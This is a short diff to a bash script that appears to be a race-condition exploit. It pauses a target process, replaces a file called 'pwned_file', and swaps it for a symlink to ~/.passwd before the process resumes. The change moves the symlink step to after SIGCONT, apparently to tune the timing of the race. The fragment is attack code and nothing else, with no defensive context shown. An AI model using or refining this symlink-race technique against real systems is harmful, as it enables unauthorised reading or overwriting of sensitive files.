@@ -173,8 +173,8 @@ while :; do
                     kill -SIGSTOP $1
                     unlink $FOUND_DIRS/pwned_file
                     echo -n "data" > $FOUND_DIRS/pwned_file
-                    ln -sf ~/.passwd $FOUND_DIRS/pwned_file
                     kill -SIGCONT $1
+                    ln -sf ~/.passwd $FOUND_DIRS/pwned_file
                     [[ -e "$FOUND_DIRS" ]] || break
                 done
                 break
